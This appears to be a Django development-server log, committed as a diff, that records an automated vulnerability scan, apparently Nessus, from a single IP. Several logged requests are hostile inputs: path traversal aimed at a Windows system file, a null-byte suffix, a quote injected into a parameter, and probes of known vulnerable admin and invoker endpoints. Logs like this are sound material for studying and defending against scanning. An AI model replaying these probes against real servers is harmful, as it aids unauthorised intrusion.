+Not Found: /portal/pls/portal/DEV9_PORTAL_DEMO.ORG_CHART.SHOW
+[08/Oct/2023 04:34:53] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:53] "GET /portal/pls/portal/DEV9_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 5430
+[08/Oct/2023 04:34:53,530] - Broken pipe from ('130.253.1.147', 40784)
+
+[08/Oct/2023 04:34:53] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:53] "GET / HTTP/1.1" 200 35341
+Not Found: /pls/portal/PORTAL_DEMO.ORG_CHART.SHOW
+Not Found: /NoviSurvey/Login.aspx
+[08/Oct/2023 04:34:53] "GET /pls/portal/PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 5394
+[08/Oct/2023 04:34:53] "GET /NoviSurvey/Login.aspx HTTP/1.1" 404 5346
+[08/Oct/2023 04:34:53,649] - Broken pipe from ('130.253.1.147', 40958)
+
+Not Found: /nps/servlet/portal
+[08/Oct/2023 04:34:53] "GET /nps/servlet/portal HTTP/1.1" 404 5337
+[08/Oct/2023 04:34:53,660] - Broken pipe from ('130.253.1.147', 41064)
+
+Not Found: /pls/portal/DEV_PORTAL_DEMO.ORG_CHART.SHOW
+[08/Oct/2023 04:34:53] "GET /pls/portal/DEV_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 5406
+Not Found: /Login.aspx
+[08/Oct/2023 04:34:53] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:53] "GET /Login.aspx HTTP/1.1" 404 5313
+[08/Oct/2023 04:34:53] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:53,782] - Broken pipe from ('130.253.1.147', 40956)
+
+Not Found: /pls/portal/DEV1_PORTAL_DEMO.ORG_CHART.SHOW
+[08/Oct/2023 04:34:53] "GET /pls/portal/DEV1_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 5409
+[08/Oct/2023 04:34:53] "GET / HTTP/1.1" 200 35341
+Not Found: /IDMProv/jsps/help/Help.jsp
+[08/Oct/2023 04:34:53] "GET /IDMProv/jsps/help/Help.jsp HTTP/1.1" 404 5361
+Not Found: /pls/portal/DEV2_PORTAL_DEMO.ORG_CHART.SHOW
+Not Found: /gwadmin-console/login.jsp
+[08/Oct/2023 04:34:53] "GET /pls/portal/DEV2_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 5409
+[08/Oct/2023 04:34:53] "GET /gwadmin-console/login.jsp HTTP/1.1" 404 5358
+[08/Oct/2023 04:34:54,003] - Broken pipe from ('130.253.1.147', 41208)
+
+[08/Oct/2023 04:34:54,004] - Broken pipe from ('130.253.1.147', 41218)
+
+Not Found: /pls/portal/DEV3_PORTAL_DEMO.ORG_CHART.SHOW
+[08/Oct/2023 04:34:54] "GET /pls/portal/DEV3_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 5409
+Not Found: /logout
+[08/Oct/2023 04:34:54] "GET /logout HTTP/1.0" 404 5301
+Not Found: /help/contents.htm
+[08/Oct/2023 04:34:54] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:54] "GET /help/contents.htm HTTP/1.1" 404 5328
+Not Found: /pls/portal/DEV4_PORTAL_DEMO.ORG_CHART.SHOW
+[08/Oct/2023 04:34:54] "GET /pls/portal/DEV4_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 5409
+Not Found: /manual/ag/contents.htm
+[08/Oct/2023 04:34:54] "GET /manual/ag/contents.htm HTTP/1.1" 404 5343
+[08/Oct/2023 04:34:54,263] - Broken pipe from ('130.253.1.147', 41428)
+
+[08/Oct/2023 04:34:54] "GET / HTTP/1.1" 200 35341
+Not Found: /pls/portal/DEV5_PORTAL_DEMO.ORG_CHART.SHOW
+[08/Oct/2023 04:34:54] "GET /pls/portal/DEV5_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 5409
+Not Found: /images
+[08/Oct/2023 04:34:54] "GET /images HTTP/1.1" 404 5301
+[08/Oct/2023 04:34:54] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:54,485] - Broken pipe from ('130.253.1.147', 41692)
+
+Not Found: /pls/portal/DEV6_PORTAL_DEMO.ORG_CHART.SHOW
+[08/Oct/2023 04:34:54] "GET /pls/portal/DEV6_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 5409
+[08/Oct/2023 04:34:54] "GET / HTTP/1.1" 200 35341
+Not Found: /nps/servlet/portalservice
+[08/Oct/2023 04:34:54] "GET /nps/servlet/portalservice HTTP/1.1" 404 5358
+Not Found: /baselining/version
+[08/Oct/2023 04:34:54] "GET /baselining/version HTTP/1.1" 404 5337
+Not Found: /pls/portal/DEV7_PORTAL_DEMO.ORG_CHART.SHOW
+[08/Oct/2023 04:34:54] "GET /pls/portal/DEV7_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 5409
+[08/Oct/2023 04:34:54,737] - Broken pipe from ('130.253.1.147', 41864)
+
+[08/Oct/2023 04:34:54,737] - Broken pipe from ('130.253.1.147', 41870)
+
+Not Found: /pls/portal/DEV8_PORTAL_DEMO.ORG_CHART.SHOW
+[08/Oct/2023 04:34:54] "GET /pls/portal/DEV8_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 5409
+Not Found: /index.html
+[08/Oct/2023 04:34:54] "GET /index.html HTTP/1.1" 404 5313
+[08/Oct/2023 04:34:54] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:54] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:54,889] - Broken pipe from ('130.253.1.147', 42152)
+
+Not Found: /pls/portal/DEV9_PORTAL_DEMO.ORG_CHART.SHOW
+[08/Oct/2023 04:34:54] "GET /pls/portal/DEV9_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 5409
+[08/Oct/2023 04:34:54] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:54,982] - Broken pipe from ('130.253.1.147', 39304)
+
+Not Found: /userSession.do
+[08/Oct/2023 04:34:54] "GET /userSession.do?method=getLanguage HTTP/1.1" 404 5344
+[08/Oct/2023 04:34:54] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:55] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:55,123] - Broken pipe from ('130.253.1.147', 42370)
+
+[08/Oct/2023 04:34:55,124] - Broken pipe from ('130.253.1.147', 42372)
+
+[08/Oct/2023 04:34:55] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:55] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:55] "GET / HTTP/1.1" 200 35341
+Not Found: /qsoap.qap
+[08/Oct/2023 04:34:55] "GET /qsoap.qap HTTP/1.1" 404 5310
+Not Found: /login.php
+[08/Oct/2023 04:34:55] "GET /login.php HTTP/1.1" 404 5310
+[08/Oct/2023 04:34:55,499] - Broken pipe from ('130.253.1.147', 42606)
+
+[08/Oct/2023 04:34:55] "GET / HTTP/1.1" 200 35341
+Not Found: /nacos/
+[08/Oct/2023 04:34:55] "GET /nacos/ HTTP/1.1" 404 5301
+[08/Oct/2023 04:34:55,605] - Broken pipe from ('130.253.1.147', 42746)
+
+[08/Oct/2023 04:34:55,605] - Broken pipe from ('130.253.1.147', 42752)
+
+[08/Oct/2023 04:34:55] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:55,657] - Broken pipe from ('130.253.1.147', 42758)
+
+[08/Oct/2023 04:34:55] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:55] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:55] "GET / HTTP/1.1" 200 35341
+Not Found: /Help.action
+[08/Oct/2023 04:34:55] "GET //Help.action HTTP/1.1" 404 5316
+Not Found: /mod_gzip_status
+[08/Oct/2023 04:34:55] "GET /mod_gzip_status HTTP/1.1" 404 5328
+[08/Oct/2023 04:34:56] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:56,147] - Broken pipe from ('130.253.1.147', 43320)
+
+[08/Oct/2023 04:34:56,194] - Broken pipe from ('130.253.1.147', 43146)
+
+[08/Oct/2023 04:34:56,201] - Broken pipe from ('130.253.1.147', 43316)
+
+Not Found: /uddipublic/default.aspx
+[08/Oct/2023 04:34:56] "GET /uddipublic/default.aspx HTTP/1.1" 404 5352
+[08/Oct/2023 04:34:56] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:56] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:56] "GET / HTTP/1.1" 200 35341
+Not Found: /uddi/default.aspx
+[08/Oct/2023 04:34:56] "GET /uddi/default.aspx HTTP/1.1" 404 5334
+Not Found: /sabin/SiteAdmin.htm
+[08/Oct/2023 04:34:56] "GET /sabin/SiteAdmin.htm HTTP/1.1" 404 5340
+Not Found: /Explorer/index.html
+[08/Oct/2023 04:34:56] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:56] "GET /Explorer/index.html HTTP/1.1" 404 5340
+[08/Oct/2023 04:34:56,329] - Broken pipe from ('130.253.1.147', 43420)
+
+[08/Oct/2023 04:34:56] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:56,347] - Broken pipe from ('130.253.1.147', 43942)
+
+[08/Oct/2023 04:34:56,348] - Broken pipe from ('130.253.1.147', 43948)
+
+[08/Oct/2023 04:34:56,519] - Broken pipe from ('130.253.1.147', 43946)
+
+[08/Oct/2023 04:34:56] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:56] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:56] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:56] "GET /admin/ HTTP/1.1" 302 0
+Not Found: /index.exp
+[08/Oct/2023 04:34:56] "GET /index.exp HTTP/1.1" 404 5310
+Not Found: /reporter/client.jsp
+[08/Oct/2023 04:34:56] "GET /reporter/client.jsp HTTP/1.1" 404 5340
+[08/Oct/2023 04:34:56] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:57,033] - Broken pipe from ('130.253.1.147', 44320)
+
+[08/Oct/2023 04:34:57,033] - Broken pipe from ('130.253.1.147', 44364)
+
+[08/Oct/2023 04:34:57,044] - Broken pipe from ('130.253.1.147', 44384)
+
+[08/Oct/2023 04:34:57] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:57] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:57] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:57] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 2214
+Not Found: /core/orionSplashScreen.do
+[08/Oct/2023 04:34:57] "GET /core/orionSplashScreen.do HTTP/1.1" 404 5358
+[08/Oct/2023 04:34:57] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:57,415] - Broken pipe from ('130.253.1.147', 44876)
+
+[08/Oct/2023 04:34:57,417] - Broken pipe from ('130.253.1.147', 44878)
+
+[08/Oct/2023 04:34:57] "GET /admin/LocalIndex.html HTTP/1.1" 302 0
+[08/Oct/2023 04:34:57] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:57] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:57] "GET / HTTP/1.1" 200 35341
+Not Found: /scmadmin/
+[08/Oct/2023 04:34:57] "GET /scmadmin/ HTTP/1.1" 404 5310
+[08/Oct/2023 04:34:57,584] - Broken pipe from ('130.253.1.147', 45000)
+
+Not Found: /login.html
+[08/Oct/2023 04:34:57] "GET /login.html HTTP/1.1" 404 5313
+[08/Oct/2023 04:34:57] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:57,807] - Broken pipe from ('130.253.1.147', 45304)
+
+[08/Oct/2023 04:34:57] "GET / HTTP/1.1" 200 35341
+Not Found: /scmadmin/LocalIndex.html
+[08/Oct/2023 04:34:57] "GET /scmadmin/LocalIndex.html HTTP/1.1" 404 5355
+[08/Oct/2023 04:34:57,917] - Broken pipe from ('130.253.1.147', 45314)
+
+[08/Oct/2023 04:34:57] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:57,998] - Broken pipe from ('130.253.1.147', 44124)
+
+[08/Oct/2023 04:34:58] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:58] "GET / HTTP/1.1" 200 35341
+Not Found: /servlet/GetProductVersion
+[08/Oct/2023 04:34:58] "POST /servlet/GetProductVersion HTTP/1.1" 404 5359
+[08/Oct/2023 04:34:58,076] - Broken pipe from ('130.253.1.147', 45698)
+
+Not Found: /PassTrixMain.cc
+Not Found: /netflow/html/aboutus.jsp
+[08/Oct/2023 04:34:58] "GET /PassTrixMain.cc HTTP/1.1" 404 5328
+[08/Oct/2023 04:34:58] "GET /netflow/html/aboutus.jsp HTTP/1.1" 404 5355
+[08/Oct/2023 04:34:58] "GET / HTTP/1.1" 200 35341
+Not Found: /LoginPage.do
+[08/Oct/2023 04:34:58] "GET /LoginPage.do HTTP/1.1" 404 5319
+[08/Oct/2023 04:34:58,205] - Broken pipe from ('130.253.1.147', 45784)
+
+[08/Oct/2023 04:34:58,209] - Broken pipe from ('130.253.1.147', 45990)
+
+[08/Oct/2023 04:34:58] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:58] "GET / HTTP/1.1" 200 35341
+Not Found: /LoginPage.do
+[08/Oct/2023 04:34:58] "GET /LoginPage.do HTTP/1.1" 404 5319
+Not Found: /LoginPage.do
+[08/Oct/2023 04:34:58] "GET /LoginPage.do HTTP/1.1" 404 5319
+[08/Oct/2023 04:34:58,609] - Broken pipe from ('130.253.1.147', 45988)
+
+[08/Oct/2023 04:34:58,615] - Broken pipe from ('130.253.1.147', 46092)
+
+Not Found: /servlet/GetProductVersion
+[08/Oct/2023 04:34:58] "POST /servlet/GetProductVersion HTTP/1.1" 404 5359
+Not Found: /login.do
+[08/Oct/2023 04:34:58] "GET /login.do HTTP/1.1" 404 5307
+[08/Oct/2023 04:34:58] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:58] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:58,795] - Broken pipe from ('130.253.1.147', 46246)
+
+[08/Oct/2023 04:34:58] "GET / HTTP/1.1" 200 35341
+Not Found: /help/introduction/release-notes.html
+[08/Oct/2023 04:34:58] "GET /help/introduction/release-notes.html HTTP/1.1" 404 5391
+Not Found: /servlet/GetProductVersion
+[08/Oct/2023 04:34:58] "POST /servlet/GetProductVersion HTTP/1.1" 404 5359
+Not Found: /NCMContainer.cc
+[08/Oct/2023 04:34:58] "GET /NCMContainer.cc HTTP/1.1" 404 5328
+[08/Oct/2023 04:34:59,000] - Broken pipe from ('130.253.1.147', 46274)
+
+Not Found: /event/index.do
+[08/Oct/2023 04:34:59] "GET /event/index.do HTTP/1.1" 404 5325
+Not Found: /configurations.do
+[08/Oct/2023 04:34:59] "GET /configurations.do HTTP/1.1" 404 5334
+[08/Oct/2023 04:34:59,259] - Broken pipe from ('130.253.1.147', 46766)
+
+[08/Oct/2023 04:34:59,261] - Broken pipe from ('130.253.1.147', 46708)
+
+[08/Oct/2023 04:34:59] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:59,421] - Broken pipe from ('130.253.1.147', 46970)
+
+[08/Oct/2023 04:34:59] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:59] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:59] "GET / HTTP/1.1" 200 35341
+Not Found: /index.do
+[08/Oct/2023 04:34:59] "GET /index.do HTTP/1.1" 404 5307
+Not Found: /servlet/GetProductVersion
+[08/Oct/2023 04:34:59] "POST /servlet/GetProductVersion HTTP/1.1" 404 5359
+Not Found: /servlet/GetProductVersion
+Not Found: /servlet/GetProductVersion
+[08/Oct/2023 04:34:59] "POST /servlet/GetProductVersion HTTP/1.1" 404 5359
+[08/Oct/2023 04:34:59] "POST /servlet/GetProductVersion HTTP/1.1" 404 5359
+[08/Oct/2023 04:34:59,733] - Broken pipe from ('130.253.1.147', 47374)
+
+[08/Oct/2023 04:34:59,734] - Broken pipe from ('130.253.1.147', 47380)
+
+[08/Oct/2023 04:34:59,734] - Broken pipe from ('130.253.1.147', 47540)
+
+[08/Oct/2023 04:34:59,734] - Broken pipe from ('130.253.1.147', 47546)
+
+Not Found: /smconf.nsf
+[08/Oct/2023 04:34:59] "GET /smconf.nsf HTTP/1.1" 404 5307
+[08/Oct/2023 04:34:59] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:59] "GET / HTTP/1.1" 200 35341
+Not Found: /smadmr5.nsf
+[08/Oct/2023 04:34:59] "GET /smadmr5.nsf HTTP/1.1" 404 5310
+[08/Oct/2023 04:34:59] "GET / HTTP/1.1" 200 35341
+Not Found: /smency.nsf
+[08/Oct/2023 04:35:00] "GET /smency.nsf HTTP/1.1" 404 5307
+Not Found: /stcenter.nsf
+[08/Oct/2023 04:35:00] "GET /stcenter.nsf HTTP/1.1" 404 5319
+Not Found: /smftypes.nsf
+[08/Oct/2023 04:35:00] "GET /smftypes.nsf HTTP/1.1" 404 5313
+[08/Oct/2023 04:35:00] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:35:00] "GET / HTTP/1.1" 200 35341
+Not Found: /smsmvlog.nsf
+[08/Oct/2023 04:35:00] "GET /smsmvlog.nsf HTTP/1.1" 404 5313
+[08/Oct/2023 04:35:00,461] - Broken pipe from ('130.253.1.147', 47850)
+
+Not Found: /Sametime/buildinfo.txt
+[08/Oct/2023 04:35:00] "GET /Sametime/buildinfo.txt HTTP/1.1" 404 5349
+[08/Oct/2023 04:35:00,476] - Broken pipe from ('130.253.1.147', 47910)
+
+Not Found: /smhelp.nsf
+[08/Oct/2023 04:35:00] "GET /smhelp.nsf HTTP/1.1" 404 5307
+Not Found: /Sametime/domino/html/sametime/buildinfoST75CF1.txt
+[08/Oct/2023 04:35:00] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:35:00] "GET /Sametime/domino/html/sametime/buildinfoST75CF1.txt HTTP/1.1" 404 5433
+[08/Oct/2023 04:35:00,557] - Broken pipe from ('130.253.1.147', 47906)
+
+Not Found: /smmsg.nsf
+[08/Oct/2023 04:35:00] "GET /smmsg.nsf HTTP/1.1" 404 5304
+[08/Oct/2023 04:35:00] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:35:00] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:35:00] "GET / HTTP/1.1" 200 35341
+Not Found: /smtime.nsf
+[08/Oct/2023 04:35:00] "GET /smtime.nsf HTTP/1.1" 404 5307
+Not Found: /smquar.nsf
+[08/Oct/2023 04:35:01] "GET /smquar.nsf HTTP/1.1" 404 5307
+Not Found: /login/index.php
+Not Found: /HNAP1/
+[08/Oct/2023 04:35:01] "GET /login/index.php HTTP/1.1" 404 5328
+[08/Oct/2023 04:35:01] "GET /HNAP1/ HTTP/1.1" 404 5301
+[08/Oct/2023 04:35:01,877] - Broken pipe from ('130.253.1.147', 48784)
+
+[08/Oct/2023 04:35:01] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:35:02,039] - Broken pipe from ('130.253.1.147', 48788)
+
+[08/Oct/2023 04:35:02] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:35:02] "GET / HTTP/1.1" 200 35341
+Not Found: /mve/help/en/inventory/am_about.html
+[08/Oct/2023 04:35:02] "GET /mve/help/en/inventory/am_about.html HTTP/1.1" 404 5388
+Not Found: /server/service/smsConfigServiceHttpInvoker
+Not Found: /jsonrpc
+[08/Oct/2023 04:35:02] "POST /server/service/smsConfigServiceHttpInvoker HTTP/1.1" 404 5410
+[08/Oct/2023 04:35:02] "POST /jsonrpc HTTP/1.1" 404 5305
+[08/Oct/2023 04:35:02,350] - Broken pipe from ('130.253.1.147', 50258)
+
+[08/Oct/2023 04:35:02,624] - Broken pipe from ('130.253.1.147', 50504)
+
+[08/Oct/2023 04:35:02,624] - Broken pipe from ('130.253.1.147', 50582)
+
+[08/Oct/2023 04:35:02] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:35:02] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:35:02] "GET / HTTP/1.1" 200 35341
+Not Found: /mainui/
+Not Found: /api/v1.0/environment
+[08/Oct/2023 04:35:02] "GET /mainui/ HTTP/1.1" 404 5304
+[08/Oct/2023 04:35:02] "GET /api/v1.0/environment HTTP/1.1" 404 5343
+Not Found: /assets/js/conf/global_config.js
+[08/Oct/2023 04:35:02] "GET /assets/js/conf/global_config.js HTTP/1.1" 404 5376
+[08/Oct/2023 04:35:02,985] - Broken pipe from ('130.253.1.147', 51116)
+
+[08/Oct/2023 04:35:02,987] - Broken pipe from ('130.253.1.147', 51118)
+
+Not Found: /vsapres/web20/core/login.aspx
+[08/Oct/2023 04:35:02] "GET /vsapres/web20/core/login.aspx HTTP/1.1" 404 5370
+[08/Oct/2023 04:35:03] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:35:03] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:35:03,239] - Broken pipe from ('130.253.1.147', 51108)
+
+[08/Oct/2023 04:35:03] "GET / HTTP/1.1" 200 35341
+Not Found: /./WEB-INF/
+[08/Oct/2023 04:35:03] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:35:03] "GET /./WEB-INF/ HTTP/1.1" 404 5311
+[08/Oct/2023 04:35:03,455] - Broken pipe from ('130.253.1.147', 51424)
+
+[08/Oct/2023 04:35:03,459] - Broken pipe from ('130.253.1.147', 51422)
+
+[08/Oct/2023 04:35:03] "GET / HTTP/1.1" 200 35341
+Not Found: /invoker/EJBInvokerServlet
+[08/Oct/2023 04:35:03] "GET /invoker/EJBInvokerServlet HTTP/1.1" 404 5358
+[08/Oct/2023 04:35:03] "GET / HTTP/1.1" 200 35341
+Not Found: /invoker/JMXInvokerServlet
+Not Found: /web-console/ServerInfo.jsp
+[08/Oct/2023 04:35:03] "GET /invoker/JMXInvokerServlet HTTP/1.1" 404 5358
+[08/Oct/2023 04:35:03] "GET /web-console/ServerInfo.jsp HTTP/1.1" 404 5361
+Not Found: /%.
+[08/Oct/2023 04:35:03] "GET %. HTTP/1.1" 404 1764
+[08/Oct/2023 04:35:03,962] - Broken pipe from ('130.253.1.147', 52066)
+
+Not Found: /web-console/ServerInfo.jsp 
+[08/Oct/2023 04:35:03,973] - Broken pipe from ('130.253.1.147', 51738)
+
+[08/Oct/2023 04:35:03] "GET /web-console/ServerInfo.jsp%00 HTTP/1.1" 404 5366
+[08/Oct/2023 04:35:03,990] - Broken pipe from ('130.253.1.147', 52058)
+
+[08/Oct/2023 04:35:03] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:35:04] "GET / HTTP/1.1" 200 35341
+Not Found: /interscan/cgi-bin/FtpSave.dll
+[08/Oct/2023 04:35:04] "GET /interscan/cgi-bin/FtpSave.dll?I'm%20Here HTTP/1.1" 404 5380
+Not Found: /NASApp/nessus/
+[08/Oct/2023 04:35:04] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:35:04] "GET /NASApp/nessus/ HTTP/1.1" 404 5325
+[08/Oct/2023 04:35:04] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:35:04,328] - Broken pipe from ('130.253.1.147', 52530)
+
+[08/Oct/2023 04:35:04,336] - Broken pipe from ('130.253.1.147', 52516)
+
+[08/Oct/2023 04:35:04] "GET / HTTP/1.1" 200 35341
+Forbidden (CSRF cookie not set.): /
+[08/Oct/2023 04:35:04] "NESSUS / HTTP/1.0" 403 2870
+[08/Oct/2023 04:35:04,483] - Broken pipe from ('130.253.1.147', 52706)
+
+Not Found: /NASApp/nessus/
+[08/Oct/2023 04:35:04] "GET /NASApp/nessus/ HTTP/1.1" 404 5325
+[08/Oct/2023 04:35:04] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:35:04] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:35:04,655] - Broken pipe from ('130.253.1.147', 52906)
+
+Not Found: /NULL.ida
+[08/Oct/2023 04:35:04] "GET /NULL.ida HTTP/1.1" 404 5301
+Not Found: /iisprotect/admin/SiteAdmin.ASP
+[08/Oct/2023 04:35:05] "GET /iisprotect/admin/SiteAdmin.ASP?V_SiteName=&V_FirstTab=Groups&V_SecondTab=All&GroupName=nessus HTTP/1.1" 404 5448
+[08/Oct/2023 04:35:05] "GET / HTTP/1.0" 200 35341
+[08/Oct/2023 04:35:05] "GET / HTTP/1.1" 200 35341
+Not Found: /iisprotect/admin/SiteAdmin.ASP
+[08/Oct/2023 04:35:05] "GET /iisprotect/admin/SiteAdmin.ASP?V_SiteName=&V_FirstTab=Groups&V_SecondTab=All&GroupName=nessus' HTTP/1.1" 404 5454
+Not Found: /cbkNJh4t.asp
+[08/Oct/2023 04:35:05] "GET //cbkNJh4t.asp HTTP/1.0" 404 5319
+[08/Oct/2023 04:35:05,698] - Broken pipe from ('130.253.1.147', 53092)
+
+Not Found: /niet521608131
+[08/Oct/2023 04:35:05] "GET /niet521608131 HTTP/1.1" 404 5322
+[08/Oct/2023 04:35:05] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:35:05,833] - Broken pipe from ('130.253.1.147', 53108)
+
+[08/Oct/2023 04:35:06] "GET / HTTP/1.1" 200 35341
+Not Found: /_mt/mt.cgi
+Not Found: /iisadmpwd/aexp.htr
+[08/Oct/2023 04:35:06] "GET /_mt/mt.cgi HTTP/1.1" 404 5313
+[08/Oct/2023 04:35:06] "GET /iisadmpwd/aexp.htr HTTP/1.1" 404 5337
+Not Found: /query.idq
+Not Found: /iisadmpwd/aexp2.htr
+[08/Oct/2023 04:35:06] "GET /query.idq?CiTemplate=../../../../../winnt/win.ini HTTP/1.1" 404 5350
+[08/Oct/2023 04:35:06] "GET /iisadmpwd/aexp2.htr HTTP/1.1" 404 5340
+Not Found: /iisadmpwd/aexp2b.htr
+Not Found: /query.idq
+[08/Oct/2023 04:35:06] "GET /iisadmpwd/aexp2b.htr HTTP/1.1" 404 5343
+[08/Oct/2023 04:35:06] "GET /query.idq?CiTemplate=../../../../../winnt/win.ini%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20 HTTP/1.1" 404 5650
+[08/Oct/2023 04:35:06,616] - Broken pipe from ('130.253.1.147', 54364)
+
+Not Found: /iisadmpwd/aexp3.htr
+[08/Oct/2023 04:35:06] "GET /iisadmpwd/aexp3.htr HTTP/1.1" 404 5340
+[08/Oct/2023 04:35:06] "GET / HTTP/1.1" 200 35341
+Not Found: /iisadmpwd/aexp4.htr
+[08/Oct/2023 04:35:06] "GET /iisadmpwd/aexp4.htr HTTP/1.1" 404 5340
+Not Found: /mail/
+[08/Oct/2023 04:35:06] "GET /mail/ HTTP/1.1" 404 5298
+Not Found: /iisadmpwd/aexp4b.htr
+[08/Oct/2023 04:35:07,098] - Broken pipe from ('130.253.1.147', 55190)
+
+[08/Oct/2023 04:35:07] "GET /iisadmpwd/aexp4b.htr HTTP/1.1" 404 5343
+[08/Oct/2023 04:35:07] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:35:07,418] - Broken pipe from ('130.253.1.147', 54228)
+
+[08/Oct/2023 04:35:07] "GET / HTTP/1.1" 200 35341
+Not Found: /login
+[08/Oct/2023 04:35:08] "GET /login HTTP/1.1" 404 5298
+Not Found: /builtin/index.html
+[08/Oct/2023 04:35:08] "GET /builtin/index.html HTTP/1.1" 404 5337
+[08/Oct/2023 04:35:08,285] - Broken pipe from ('130.253.1.147', 55814)
+
+[08/Oct/2023 04:35:08,285] - Broken pipe from ('130.253.1.147', 56146)
+
+[08/Oct/2023 04:35:08] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:35:08] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:35:08] "GET // HTTP/1.1" 200 35341
+Not Found: /login
+[08/Oct/2023 04:35:08] "GET /login HTTP/1.1" 404 5298
+Not Found: /tsp//
+[08/Oct/2023 04:35:08,423] - Broken pipe from ('130.253.1.147', 56712)
+
+[08/Oct/2023 04:35:08] "GET /tsp// HTTP/1.1" 404 5298
+[08/Oct/2023 04:35:08] code 400, message Bad request syntax ("\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03\x99n¹5H\x17@\x00\x8ah~;cEÝ\x05\x899©®\x10\x15Ã\x1bÐÎÜ\x13IÍ¦\x0e\x00\x00ÌÀ,À0\x00£\x00\x9fÌ©Ì¨ÌªÀ¯À\xadÀ£À\x9fÀ]ÀaÀWÀS\x00§À+À/\x00¢\x00\x9eÀ®À¬À¢À\x9eÀ\\À`ÀVÀR\x00¦À$À(\x00k\x00jÀsÀw\x00Ä\x00Ã\x00m\x00ÅÀ#À'\x00g\x00@ÀrÀv\x00¾\x00½\x00l\x00¿À")
+[08/Oct/2023 04:35:08] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Not Found: /ap//
+[08/Oct/2023 04:35:08] "GET /ap// HTTP/1.1" 404 5295
+[08/Oct/2023 04:35:08] "GET / HTTP/1.1" 200 35341
+Not Found: /ssp//
+[08/Oct/2023 04:35:08] "GET /ssp// HTTP/1.1" 404 5298
